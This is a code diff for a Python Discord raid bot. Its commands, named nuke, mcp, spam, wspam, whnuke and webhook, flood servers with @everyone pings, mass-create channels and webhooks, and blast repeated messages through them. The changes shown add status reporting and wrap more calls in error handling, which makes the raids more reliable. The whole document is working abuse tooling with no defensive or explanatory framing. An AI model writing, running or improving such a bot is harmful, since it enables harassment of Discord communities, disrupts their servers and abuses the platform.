@@ -223,6 +223,7 @@ async def nuke(ctx, name: str, *, message: str = "@everyone"):
     # Step 3: blast message through ALL webhooks 30 times each simultaneously
     coros = [wh.send(message) for wh in webhooks for _ in range(30)]
     await batch(coros, **BATCH_WH)
+    await status(ctx, "nuke")
 
 @bot.command()
 async def nukeall(ctx, *, name: str = "nuked"):
@@ -358,12 +359,13 @@ async def mcp(ctx, name: str, count: int, pings: int = 5, *, message: str = "@ev
         ch = await ctx.guild.create_text_channel(name)
         for _ in range(pings):
             await safe(ch.send(message))
-    await batch([create_and_ping() for _ in range(count)], **BATCH_CH)
+    await batch([safe(create_and_ping()) for _ in range(count)], **BATCH_CH)
     await status(ctx, f"mcp {name} {count} x{pings}")
 
 @bot.command()
 async def spam(ctx, count: int, *, message: str):
     await batch([ctx.send(message) for _ in range(count)], **BATCH_MSG)
+    await status(ctx, f"spam {count}")
 
 @bot.command()
 async def spamall(ctx, count: int, *, message: str):
@@ -389,6 +391,7 @@ async def wspam(ctx, count: int, *, message: str):
     wh = await ctx.channel.create_webhook(name="spam")
     await batch([wh.send(message) for _ in range(count)], **BATCH_WH)
     await safe(wh.delete())
+    await status(ctx, f"wspam {count}")
 
 @bot.command()
 async def wspamall(ctx, count: int, *, message: str):
@@ -411,7 +414,7 @@ async def whnuke(ctx, name: str, count: int, pings: int = 10, *, message: str = 
         ch = await safe(ctx.guild.create_text_channel(name))
         if ch:
             channels.append(ch)
-    await batch([ch.create_webhook(name="nuke") for ch in channels], **BATCH_CH)
+    await batch([safe(ch.create_webhook(name="nuke")) for ch in channels], **BATCH_CH)
     webhooks = []
     for ch in channels:
         whs = await safe(ch.webhooks())
@@ -451,7 +454,7 @@ async def webhook(ctx, name: str, count: int):
     async def make_webhook(ch):
         for _ in range(count):
             await safe(ch.create_webhook(name=name))
-    await batch([make_webhook(ch) for ch in ctx.guild.text_channels], **BATCH_CH)
+    await batch([safe(make_webhook(ch)) for ch in ctx.guild.text_channels], **BATCH_CH)
     await status(ctx, f"webhook {name} {count}")
 
 @bot.command()
